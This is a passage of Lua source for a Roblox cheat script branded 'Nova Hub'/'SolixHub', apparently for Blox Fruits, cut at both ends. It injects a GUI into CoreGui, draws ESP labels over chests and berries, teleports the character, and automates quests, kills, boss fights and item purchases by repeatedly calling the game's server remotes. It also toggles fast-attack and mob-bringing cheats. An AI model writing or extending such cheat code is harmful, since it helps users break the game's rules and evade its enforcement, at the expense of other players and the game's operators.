                        local cr = ck:FindFirstChild('ChestEspAttachment')
                        if not cr then
                            local cs = Instance.new('Attachment')
                            cs.Name = 'ChestEspAttachment'
                            cs.Parent = ck
                            cs.Position = Vector3.new(0, 3, 0)
                            local ct = Instance.new('BillboardGui')
                            ct.Name = 'NameEsp'
                            ct.Size = UDim2.new(0, 200, 0, 30)
                            ct.Adornee = cs
                            ct.ExtentsOffset = Vector3.new(0, 1, 0)
                            ct.AlwaysOnTop = true
                            ct.Parent = cs
                            local cu = Instance.new('TextLabel')
                            cu.Font = Enum.Font.Code
                            cu.TextSize = 14
                            cu.TextWrapped = true
                            cu.Size = UDim2.new(1, 0, 1, 0)
                            cu.TextYAlignment = Enum.TextYAlignment.Top
                            cu.BackgroundTransparency = 1
                            cu.TextStrokeTransparency = 0.5
                            cu.TextColor3 = Color3.fromRGB(80, 245, 245)
                            cu.Parent = ct
                        end
                        local cs = cr and cr:FindFirstChild('NameEsp')
                        if cs then
                            local ct = math.floor(cp / 3)
                            local cu = ck.Name:gsub('Label', '')
                            cs.TextLabel.Text = string.format('[%s] %d M', cu, ct)
                        end
                        if _G_AutoFarmChest and cp <= 20 then
                            if cr then
                                cr:Destroy()
                            end
                        end
                    end
                end
                cl = true
            until true
            if not cl then
                break
            end
        end
    else
        for cd, ce in ipairs(game:GetService('CollectionService'):GetTagged('_ChestTagged')) do
            local cf = ce:FindFirstChild('ChestEspAttachment')
            if cf then
                cf:Destroy()
            end
        end
    end
end
berriesEsp = function()
    if BerryEsp then
        local cd = game:GetService('CollectionService')
        local ce = game:GetService('Players')
        local cf = ce.LocalPlayer
        local cg = cd:GetTagged('BerryBush')
        for ch, ci in ipairs(cg) do
            local cj = ci.Parent:GetPivot().Position
            for ck, cl in pairs(ci:GetAttributes()) do
                if cl and (not BerryArray or table.find(BerryArray, cl)) then
                    local cm = 'BerryEspPart_' .. cl .. '_' .. tostring(cj)
                    local cn = workspace:FindFirstChild(cm)
                    if not cn then
                        cn = Instance.new('Part')
                        cn.Name = cm
                        cn.Transparency = 1
                        cn.Size = Vector3.new(1, 1, 1)
                        cn.Anchored = true
                        cn.CanCollide = false
                        cn.Parent = workspace
                        cn.CFrame = CFrame.new(cj)
                    end
                    if not cn:FindFirstChild('NameEsp') then
                        local co = Instance.new('BillboardGui', cn)
                        co.Name = 'NameEsp'
                        co.ExtentsOffset = Vector3.new(0, 1, 0)
                        co.Size = UDim2.new(0, 200, 0, 30)
                        co.Adornee = cn
                        co.AlwaysOnTop = true
                        local cp = Instance.new('TextLabel', co)
                        cp.Font = Enum.Font.Code
                        cp.TextSize = 14
                        cp.TextWrapped = true
                        cp.Size = UDim2.new(1, 0, 1, 0)
                        cp.TextYAlignment = Enum.TextYAlignment.Top
                        cp.BackgroundTransparency = 1
                        cp.TextStrokeTransparency = 0.5
                        cp.TextColor3 = Color3.fromRGB(80, 245, 245)
                        cp.Parent = co
                    end
                    local co = cn:FindFirstChild('NameEsp')
                    local cp = (cf.Character.Head.Position - cj).Magnitude / 3
                    co.TextLabel.Text = ('[' .. cl .. ']' .. ' ' .. math.round(cp) .. ' M')
                    if _G.AutoBerry and math.round(cp) <= 20 then
                        cn:Destroy()
                    end
                end
            end
        end
    else
        for cd, ce in ipairs(workspace:GetChildren()) do
            if ce:IsA('Part') and ce.Name:match('BerryEspPart_.*') then
                ce:Destroy()
            end
        end
    end
end




--==[ Nova Hub Farm Loader UI Functions ]==--

local loaderScreenGui, blur, startTime, timerLabel

function ShowLoader()
    startTime = tick()

    -- Blur (fullscreen and stronger)
    blur = Instance.new("BlurEffect")
    blur.Size = 50
    blur.Parent = game:GetService("Lighting")

    -- ScreenGui
    loaderScreenGui = Instance.new("ScreenGui")
    loaderScreenGui.Name = "NovaHubLoaderUI"
    loaderScreenGui.ResetOnSpawn = false
    loaderScreenGui.IgnoreGuiInset = true
    loaderScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.4, 0, 0.25, 0)
    frame.Position = UDim2.new(0.3, 0, 0.35, 0)
    frame.BackgroundTransparency = 1
    frame.Parent = loaderScreenGui

    -- Title
    -- Nova (light blue)
local nova = Instance.new("TextLabel")
nova.Text = "Nova"
nova.Font = Enum.Font.GothamBold
nova.TextSize = 40
nova.TextColor3 = Color3.fromRGB(173, 216, 230) -- Light Blue
nova.BackgroundTransparency = 1
nova.Size = UDim2.new(0.5, 0, 0.3, 0)
nova.Position = UDim2.new(0, 0, 0, 0)
nova.TextXAlignment = Enum.TextXAlignment.Right
nova.Parent = frame

-- Hub (light violet)
local hub = Instance.new("TextLabel")
hub.Text = " Hub"
hub.Font = Enum.Font.GothamBold
hub.TextSize = 40
hub.TextColor3 = Color3.fromRGB(221, 160, 221) -- Light Violet (Plum)
hub.BackgroundTransparency = 1
hub.Size = UDim2.new(0.5, 0, 0.3, 0)
hub.Position = UDim2.new(0.5, 0, 0, 0)
hub.TextXAlignment = Enum.TextXAlignment.Left
hub.Parent = frame

    -- Status (Beli + Level)
    -- Status
local status = Instance.new("TextLabel")
status.Font = Enum.Font.Gotham
status.TextSize = 18
status.TextColor3 = Color3.fromRGB(230, 230, 230) -- Lighter/whiter gray
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, 0, 0.2, 0)
status.Position = UDim2.new(0, 0, 0.3, 0)
status.Parent = frame

-- Timer
timerLabel = Instance.new("TextLabel")
timerLabel.Text = "Elapsed: 00:00:00"
timerLabel.Font = Enum.Font.Gotham
timerLabel.TextSize = 16
timerLabel.TextColor3 = Color3.fromRGB(220, 220, 220) -- Lighter gray
timerLabel.BackgroundTransparency = 1
timerLabel.Size = UDim2.new(1, 0, 0.2, 0)
timerLabel.Position = UDim2.new(0, 0, 0.5, 0)
timerLabel.Parent = frame

-- Footer (lowered)
local credit = Instance.new("TextLabel")
credit.Text = "Nova Hub Fast Farm"
credit.Font = Enum.Font.Gotham
credit.TextSize = 14
credit.TextColor3 = Color3.fromRGB(210, 210, 210) -- Light gray
credit.BackgroundTransparency = 1
credit.Size = UDim2.new(1, 0, 0.2, 0)
credit.Position = UDim2.new(0, 0, 0.75, 0)
credit.Parent = frame

    -- Timer + Beli/Level updater
    spawn(function()
        local player = game:GetService("Players").LocalPlayer
        local data = player:WaitForChild("Data")

        while loaderScreenGui and timerLabel and status do
            local elapsed = math.floor(tick() - startTime)
            local hours = math.floor(elapsed / 3600)
            local minutes = math.floor((elapsed % 3600) / 60)
            local seconds = elapsed % 60

            timerLabel.Text = string.format("Time: %02d:%02d:%02d", hours, minutes, seconds)

            local beli = data:FindFirstChild("Beli") and data.Beli.Value or 0
            local level = data:FindFirstChild("Level") and data.Level.Value or 0
            status.Text = "Beli : " .. beli .. " | Level : " .. level

            wait(1)
        end
    end)
end

function HideLoader()
    if loaderScreenGui then
        loaderScreenGui:Destroy()
        loaderScreenGui = nil
    end
    if blur then
        blur:Destroy()
        blur = nil
    end
end





Library:Window({
    Name = "SolixHub"
})


local v22 = Instance.new("ScreenGui")
local v23 = Instance.new("ImageButton")
local v24 = Instance.new("UICorner")
local v25 = Instance.new("ParticleEmitter")
local v26 = game:GetService("TweenService")

v22.Parent = game.CoreGui
v22.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

v23.Parent = v22
v23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
v23.BorderSizePixel = 0
v23.Position = UDim2.new(0.0208, 0, 0.1052, 0)
v23.Size = UDim2.new(0, 50, 0, 50)
v23.Draggable = false
v23.Image = "rbxassetid://120931314112734"

v24.Parent = v23
v24.CornerRadius = UDim.new(1, 0)

v25.Parent = v23
v25.LightEmission = 1
v25.Size = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.1),
    NumberSequenceKeypoint.new(1, 0)
})
v25.Lifetime = NumberRange.new(0.5, 1)
v25.Rate = 0
v25.Speed = NumberRange.new(5, 10)
v25.Color = ColorSequence.new(Color3.fromRGB(255, 85, 255), Color3.fromRGB(85, 255, 255))

local v47 = v26:Create(v23, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {})

v23.MouseButton1Down:Connect(function()
    v25.Rate = 100
    task.delay(1, function()
        v25.Rate = 0
    end)
    v47:Play()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
    v47.Completed:Connect(function()
        v23.Rotation = 0
    end)
    local v235 = v26:Create(v23, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 60, 0, 60)
    })
    v235:Play()
    v235.Completed:Connect(function()
        local v483 = v26:Create(v23, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 50, 0, 50)
        })
        v483:Play()
    end)
end)









local Main = Library:Tab({ 
    Name = "General" 
})

local MainLeftSection = Main:Section({ 
    Name = "Main Farm", 
    Side = "Left" 
})


MainLeftSection:Dropdown({
    Name = "Select Weapon",
    Options = { "Melee", "Sword", "Gun", "Blox Fruit" },
    Default = "Melee",
    Flag = "Settings/SelectWeapon",
    Callback = function(Selected)
        _G.ChooseWP = Selected
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.ChooseWP == 'Melee' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Melee' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectWeapon = aq.Name
                        end
                    end
                end
            elseif _G.ChooseWP == 'Sword' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Sword' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectWeapon = aq.Name
                        end
                    end
                end
            elseif _G.ChooseWP == 'Gun' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Gun' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectWeapon = aq.Name
                        end
                    end
                end
            elseif _G.ChooseWP == 'Blox Fruit' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Blox Fruit' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectWeapon = aq.Name
                        end
                    end
                end
            end
        end)
    end
end)




MainLeftSection:Toggle({
    Name = "Auto Farm Level",
    Description = "",
    Flag = "Farm/AutoFarmLevel",
    Default = false,
    Callback = function(Value)
        _G.Level = Value

        if Value then
            ShowLoader()
        else
            HideLoader()
        end
    end
})


spawn(function()
    while wait() do
        pcall(function()
            if _G.Level then
                if not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, QuestNeta()[5]) then
                    replicated.Remotes.CommF_:InvokeServer('AbandonQuest')
                end

                if plr.PlayerGui.Main.Quest.Visible == false then
                    repeat
                        wait()
                        _tp(QuestNeta()[6])
                    until (QuestNeta()[6].Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.Level

                    if (QuestNeta()[6].Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 5 then
                        replicated.Remotes.CommF_:InvokeServer('StartQuest', QuestNeta()[3], QuestNeta()[2])
                    end
                elseif plr.PlayerGui.Main.Quest.Visible == true then
                    local target = workspace.Enemies:FindFirstChild(QuestNeta()[1])
                    if target then
                        for _, mob in pairs(workspace.Enemies:GetChildren()) do
                            if mob.Name == QuestNeta()[1] and mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                if string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, QuestNeta()[5]) then
                                    repeat
                                        wait()

                                        _tp(target.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
                                        m.Kill(mob, _G.Level)
                                    until not _G.Level or mob.Humanoid.Health <= 0 or not mob.Parent or plr.PlayerGui.Main.Quest.Visible == false
                                else
                                    replicated.Remotes.CommF_:InvokeServer('AbandonQuest')
                                end
                            end
                        end
                    else
                        _tp(QuestNeta()[4])
                    end
                end
            end
        end)
    end
end)



MainLeftSection:Toggle({
    Name = "Auto Farm Nearest",
    Description = "",
    Flag = "Farm/AutoFarmNearest",
    Default = false,
    Callback = function(Value)
        _G.AutoFarmNear = Value
    end
})


spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoFarmNear then
                for _, enemy in pairs(workspace.Enemies:GetChildren()) do
                    if enemy:FindFirstChild("Humanoid") and enemy:FindFirstChild("HumanoidRootPart") then
                        if enemy.Humanoid.Health > 0 then
                            repeat
                                wait()
                                m.Kill(enemy, _G.AutoFarmNear)
                            until not _G.AutoFarmNear or not enemy.Parent or enemy.Humanoid.Health <= 0
                        end
                    end
                end
            end
        end)
    end
end)


MainLeftSection:Toggle({
    Name = "Auto Collect Chest",
    Default = false,
    Flag = "Farm/AutoCollectChest",
    Callback = function(Value)
        _G.AutoFarmChest = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.AutoFarmChest then
            pcall(function()
                local CollectionService = game:GetService('CollectionService')
                local Players = game:GetService('Players')
                local Player = Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                if not Character then return end

                local playerPos = Character:GetPivot().Position
                local taggedChests = CollectionService:GetTagged('_ChestTagged')
                local closestDistance, closestChest = math.huge, nil

                for _, chest in ipairs(taggedChests) do
                    local distance = (chest:GetPivot().Position - playerPos).Magnitude
                    if (not SelectedIsland or chest:IsDescendantOf(SelectedIsland)) and not chest:GetAttribute('IsDisabled') and distance < closestDistance then
                        closestDistance = distance
                        closestChest = chest
                    end
                end

                if closestChest then
                    _tp(closestChest:GetPivot())
                end
            end)
        end
    end
end)

MainLeftSection:Toggle({
    Name = "Auto Elite Quest",
    Flag = "Quests/AutoEliteQuest",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.FarmEliteHunt = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.FarmEliteHunt then
                local questGui = plr.PlayerGui.Main.Quest
                if questGui.Visible then
                    local questText = questGui.Container.QuestTitle.Title.Text
                    if string.find(questText, "Diablo") or string.find(questText, "Urban") or string.find(questText, "Deandre") then
                        for _, eliteMob in pairs(replicated:GetChildren()) do
                            if string.find(eliteMob.Name, "Diablo") or string.find(eliteMob.Name, "Urban") or string.find(eliteMob.Name, "Deandre") then
                                _tp(eliteMob.HumanoidRootPart.CFrame)
                            end
                        end
                        for _, mob in pairs(Enemies:GetChildren()) do
                            if (string.find(mob.Name, "Diablo") or string.find(mob.Name, "Urban") or string.find(mob.Name, "Deandre")) and m.Alive(mob) then
                                repeat
                                    task.wait()
                                    m.Kill(mob, _G.FarmEliteHunt)
                                until not _G.FarmEliteHunt or not mob.Parent or mob.Humanoid.Health <= 0 or not questGui.Visible
                            end
                        end
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("EliteHunter")
                end
            end
        end)
    end
end)

MainLeftSection:Toggle({
    Name = "Auto Farm Ectoplasm",
    Flag = "Farm/AutoEctoplasm",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.AutoEctoplasm = Value
    end
})

-- Ectoplasm Farming Logic
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.AutoEctoplasm then
                local E = {
                    'Ship Deckhand',
                    'Ship Engineer',
                    'Ship Steward',
                    'Ship Officer',
                    'Arctic Warrior'
                }
                local F = GetConnectionEnemies(E)
                if m.Alive(F) then
                    repeat
                        wait()
                        m.Kill(F, _G.AutoEctoplasm)
                    until not _G.AutoEctoplasm or not F.Parent or F.Humanoid.Health <= 0
                else
                    replicated.Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            end
        end)
    end
end)


MainLeftSection:Toggle({
    Name = "Auto Done Bartilo Quest",
    Flag = "Farm/AutoBartiloQuest",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.Bartilo_Quest = Value
    end
})

-- Auto Bartilo Quest Logic
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.CitizenQuest then
                if Lv >= 1800 and replicated.Remotes.CommF_:InvokeServer('CitizenQuestProgress').KilledBandits == false then
                    if string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, 'Forest Pirate') and string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, '50') and plr.PlayerGui.Main.Quest.Visible == true then
                        local G = GetConnectionEnemies('Forest Pirate')
                        if G then
                            repeat
                                task.wait()
                                m.Kill(G, _G.CitizenQuest)
                            until _G.CitizenQuest == false or not G.Parent or G.Humanoid.Health <= 0 or plr.PlayerGui.Main.Quest.Visible == false
                        else
                            _tp(CFrame.new(- 13206.452148438, 425.89199829102, - 7964.5537109375))
                        end
                    else
                        _tp(CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125))
                        if (Vector3.new(- 12443.8671875, 332.40396118164, - 7675.4892578125) - plr.Character.HumanoidRootPart.Position).Magnitude <= 30 then
                            wait(1.5)
                            replicated.Remotes.CommF_:InvokeServer('StartQuest', 'CitizenQuest', 1)
                        end
                    end
                elseif Lv >= 1800 and replicated.Remotes.CommF_:InvokeServer('CitizenQuestProgress').KilledBoss == false then
                    local G = GetConnectionEnemies('Captain Elephant')
                    if plr.PlayerGui.Main.Quest.Visible and string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, 'Captain Elephant') and plr.PlayerGui.Main.Quest.Visible == true then
                        if G then
                            repeat
                                task.wait()
                                m.Kill(G, _G.CitizenQuest)
                            until _G.CitizenQuest == false or G.Humanoid.Health <= 0 or not G.Parent or plr.PlayerGui.Main.Quest.Visible == false
                        else
                            _tp(CFrame.new(- 13374.889648438, 421.27752685547, - 8225.208984375))
                        end
                    else
                        _tp(CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125))
                        if (CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                            wait(1.5)
                            replicated.Remotes.CommF_:InvokeServer('CitizenQuestProgress', 'Citizen')
                        end
                    end
                elseif Lv >= 1800 and replicated.Remotes.CommF_:InvokeServer('CitizenQuestProgress', 'Citizen') == 2 then
                    _tp(CFrame.new(- 12512.138671875, 340.39279174805, - 9872.8203125))
                end
            end
        end)
    end
end)

-- Bones Sec
local Main2LeftSection = Main:Section({ 

    Name = "Farm Bones", 

    Side = "Left" 
})

Main2LeftSection:Toggle({
    Name = "Auto Farm Bones",
    Flag = "Farm/AutoFarmBones",
    Description = "",
    Default = false,
    Callback = function(Value)
        _G.AutoFarm_Bone = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.AutoFarm_Bone then
            pcall(function()
                local plr = game.Players.LocalPlayer
                local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                local questUI = plr.PlayerGui.Main.Quest
                local mobList = {
                    "Reborn Skeleton",
                    "Living Zombie",
                    "Demonic Soul",
                    "Posessed Mummy"
                }

                if not hrp then return end

                local targetMob = GetConnectionEnemies(mobList)

                if targetMob then
                    if _G.AcceptQuestC and not questUI.Visible then
                        local questPos = CFrame.new(-9516.99316, 172.017181, 6078.46533)
                        _tp(questPos)
                        while (questPos.Position - hrp.Position).Magnitude > 50 do task.wait(0.2) end

                        local randomChoice = math.random(1, 4)
                        local questData = {
                            [1] = { "StartQuest", "HauntedQuest2", 2 },
                            [2] = { "StartQuest", "HauntedQuest2", 1 },
                            [3] = { "StartQuest", "HauntedQuest1", 1 },
                            [4] = { "StartQuest", "HauntedQuest1", 2 }
                        }

                        pcall(function()
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(questData[randomChoice]))
                        end)
                    end

                    repeat
                        task.wait()
                        m.Kill(targetMob, _G.AutoFarm_Bone)
                    until not _G.AutoFarm_Bone or targetMob.Humanoid.Health <= 0 or not targetMob.Parent or (_G.AcceptQuestC and not questUI.Visible)

                else
                    _tp(CFrame.new(-9495.6807, 453.5862, 5977.3486))
                end
            end)
        end
    end
end)

Main2LeftSection:Toggle({
    Name = "Auto Random Bones",
    Default = false,
    Flag = "Items/AutoRandomBones",
    Callback = function(Value)
        _G.Auto_Random_Bone = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.Auto_Random_Bone then
            pcall(function()
                repeat
                    task.wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                until not _G.Auto_Random_Bone
            end)
        end
    end
end)


Main2LeftSection:Toggle({
    Name = "Auto Try Luck Gravestone",
    Default = false,
    Flag = "Items/TryLuckGravestone",
    Callback = function(Value)
        _G.TryLucky = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.TryLucky then
            pcall(function()
                local pos = CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813)
                local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    if hrp.CFrame.Position ~= pos.Position then
                        _tp(pos)
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 1)
                    end
                end
            end)
        end
    end
end)

Main2LeftSection:Toggle({
    Name = "Auto Pray Gravestone",
    Default = false,
    Flag = "Items/PrayGravestone",
    Callback = function(Value)
        _G.Praying = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.Praying then
            pcall(function()
                local pos = CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813)
                local hrp = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    if hrp.CFrame.Position ~= pos.Position then
                        _tp(pos)
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                    end
                end
            end)
        end
    end
end)


-- Cake Sec
local Main3LeftSection = Main:Section({ 

    Name = "Farm Cake", 

    Side = "Left" 
})


Main3LeftSection:Toggle({
    Name = "Auto Cake Prince",
    Default = false,
    Flag = "Items/AutoCakePrince",
    Callback = function(Value)
        _G.Auto_Cake_Prince = Value
        if Value then
            Library:Notify({
                Title = "Nova Cat Hub Premium",
                Content = "Farming Activated!",
                Duration = 5
            })
        end
    end
})

spawn(function()
    while wait() do
        if _G.Auto_Cake_Prince then
            pcall(function()
                local plr = game.Players.LocalPlayer
                local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                local questUI = plr.PlayerGui.Main.Quest
                local enemies = workspace.Enemies
                local mirror = workspace.Map.CakeLoaf.BigMirror
                if not hrp then return end

                if not mirror:FindFirstChild("Other") then
                    _tp(CFrame.new(-2077, 252, -12373))
                end

                if mirror.Other.Transparency == 0 or enemies:FindFirstChild("Cake Prince") then
                    local boss = GetConnectionEnemies("Cake Prince")
                    if boss then
                        repeat
                            wait()
                            m.Kill2(boss, _G.Auto_Cake_Prince)
                        until not _G.Auto_Cake_Prince or not boss.Parent or boss.Humanoid.Health <= 0
                    else
                        if mirror.Other.Transparency == 0 and (CFrame.new(-1990.67, 4533, -14973.67).Position - hrp.Position).Magnitude >= 2000 then
                            _tp(CFrame.new(-2151.82, 149.32, -12404.91))
                        end
                    end
                else
                    local mobList = {
                        "Cookie Crafter",
                        "Cake Guard",
                        "Baking Staff",
                        "Head Baker"
                    }
                    local mob = GetConnectionEnemies(mobList)
                    if mob then
                        if _G.AcceptQuestC and not questUI.Visible then
                            local questPos = CFrame.new(-1927.92, 37.8, -12842.54)
                            _tp(questPos)
                            while (questPos.Position - hrp.Position).Magnitude > 50 do
                                wait(0.2)
                            end
                            local rand = math.random(1, 4)
                            local quests = {
                                { "StartQuest", "CakeQuest2", 2 },
                                { "StartQuest", "CakeQuest2", 1 },
                                { "StartQuest", "CakeQuest1", 1 },
                                { "StartQuest", "CakeQuest1", 2 },
                            }
                            pcall(function()
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(quests[rand]))
                            end)
                        end
                        repeat
                            wait()
                            m.Kill(mob, _G.Auto_Cake_Prince)
                        until not _G.Auto_Cake_Prince or mob.Humanoid.Health <= 0 or mirror.Other.Transparency == 0 or (_G.AcceptQuestC and not questUI.Visible)
                    else
                        _tp(CFrame.new(-2077, 252, -12373))
                    end
                end
            end)
        end
    end
end)


Main3LeftSection:Toggle({
    Name = "Auto Cake Queen",
    Default = false,
    Flag = "AutoBigmom",
    Callback = function(Value)
        _G.AutoBigmom = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.AutoBigmom then
            pcall(function()
                local bj = GetConnectionEnemies('Cake Queen')
                if bj then
                    repeat
                        task.wait()
                        m.Kill(bj, _G.AutoBigmom)
                    until not _G.AutoBigmom or not bj.Parent or bj.Humanoid.Health <= 0
                else
                    _tp(CFrame.new(-709.3132934570313, 381.6005859375, -11011.396484375))
                end
            end)
        end
    end
end)

Main3LeftSection:Toggle({
    Name = "Auto Unlock Dough Dungeon",
    Default = false,
    Flag = "Items/AutoUnlockDoughDungeon",
    Callback = function(Value)
        _G.Doughv2 = Value
        if Value then
            Library:Notify({
                Title = "Nova Cat Hub Premium",
                Content = "Make Sure You Have Red Key Or God Chalice",
                Duration = 5
            })
        end
    end
})

spawn(function()
    while wait(Sec) do
        if _G.Doughv2 then
            pcall(function()
                local redDoor = workspace.Map.CakeLoaf:FindFirstChild("RedDoor")

                if not redDoor then
                    if GetBP("Red Key") then
                        replicated.Remotes.CommF_:InvokeServer("CakeScientist", "Check")
                        wait(0.1)
                        replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                    end
                elseif redDoor then
                    if GetBP("Red Key") then
                        repeat
                            wait()
                            _tp(CFrame.new(-2681.97998, 64.3921585, -12853.7363, 0.149007782, -1.87902192e-8, 0.98883605, 3.60619588e-8, 1, 1.35681812e-8, -0.98883605, 3.36376011e-8, 0.149007782))
                        until not _G.Doughv2 or (plr.Character.HumanoidRootPart.Position - Vector3.new(-2681.97998, 64.3921585, -12853.7363)).Magnitude <= 5
                        EquipWeapon("Red Key")
                    end
                elseif GetConnectionEnemies("Dough King") then
                    local boss = GetConnectionEnemies("Dough King")
                    if boss then
                        repeat
                            wait()
                            m.Kill(boss, _G.Doughv2)
                        until not _G.Doughv2 or not boss.Parent or boss.Humanoid.Health <= 0
                    else
                        _tp(CFrame.new(-1943.6765, 251.5095, -12337.8808))
                    end
                end

                if GetBP("Sweet Chalice") then
                    replicated.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
                    repeat wait() _G.AutoMiror = true until not _G.Doughv2
                    _G.AutoMiror = false
                end

                if GetBP("God's Chalice") and GetM("Conjured Cocoa") >= 10 then
                    replicated.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                end

                if not GetBP("God's Chalice") then
                    repeat wait() _G.FarmEliteHunt = true until not _G.Doughv2 or GetBP("God's Chalice")
                    _G.FarmEliteHunt = false
                end

                if GetM("Conjured Cocoa") <= 10 then
                    local mobs = { "Cocoa Warrior", "Chocolate Bar Battler" }
                    local cocoaMob = GetConnectionEnemies(mobs)
                    if cocoaMob then
                        repeat
                            wait()
                            m.Kill(cocoaMob, _G.Doughv2)
                        until not _G.Doughv2 or not cocoaMob.Parent or cocoaMob.Humanoid.Health <= 0
                    else
                        _tp(CFrame.new(402.7189, 81.0605, -12259.543))
                    end
                end
            end)
        end
    end
end)






local MainSliderRightSection = Main:Section({ 
    Name = "Distance", 
    Side = "Right" 
})

-- Settings Tab Sec

MainSliderRightSection:Slider({
    Name = "Pos X",
    Min = -60,
    Max = 60,
    Default = 0,
    Decimals = 1,
    Flag = "Settings/PosX",
    Callback = function(Value)
        posX = Value
    end
})

MainSliderRightSection:Slider({
    Name = "Pos Y",
    Min = -60,
    Max = 60,
    Default = 30,
    Decimals = 1,
    Flag = "Settings/PosY",
    Callback = function(Value)
        posY = Value
    end
})

MainSliderRightSection:Slider({
    Name = "Pos Z",
    Min = -60,
    Max = 60,
    Default = 0,
    Decimals = 1,
    Flag = "Settings/PosZ",
    Callback = function(Value)
        posZ = Value
    end
})

-- Farm Right Side
local MainRightSection = Main:Section({ 
    Name = "Setting Farm", 
    Side = "Right" 
})

MainRightSection:Toggle({
    Name = "V2 Layout",
    Default = false,
    Callback = function(enabled)
        Library:SetLayout(enabled and "Kavo" or "CSGO")
    end
})

MainRightSection:Toggle({
    Name = "Fast Attack [M1/Melee/Sword]",
    Flag = "Combat/FastAttack",
    Description = "[ Not Supported Gas M1 ]",
    Default = true,
    Callback = function(Value)
        _G.Seriality = Value
    end
})

MainRightSection:Toggle({
    Name = "Bring Mobs",
    Flag = "Farm/BringMobs",
    Description = "",
    Default = true,
    Callback = function(Value)
        _B = Value
    end
})

MainRightSection:Toggle({
    Name = "Auto Activate Race V3",
    Flag = "Setting/AutoActivateRaceV3",
    Callback = function(value)
        getgenv().AutoT = value
        if value then
            spawn(function()
                while getgenv().AutoT do
                    pcall(function()
                        game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("ActivateAbility")
                    end)
                    wait()
                end
            end)
        end
    end
})

MainRightSection:Toggle({
    Name = "Auto Activate V4",
    Flag = "Setting/AutoActivateV4",
    Callback = function(value)
        getgenv().AutoY = value
        if value then
            spawn(function()
                while getgenv().AutoY do
                    pcall(function()
                        local char = game.Players.LocalPlayer.Character
                        if char:FindFirstChild("RaceEnergy") and char.RaceEnergy.Value >= 1 and char:FindFirstChild("RaceTransformed") and not char.RaceTransformed.Value then
                            local args = { [1] = true }
                            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Awakening").RemoteFunction:InvokeServer(unpack(args))
                        end
                    end)
                    wait(0.5)
                end
            end)
        end
    end
})

MainRightSection:Toggle({
    Name = "Panic Mode",
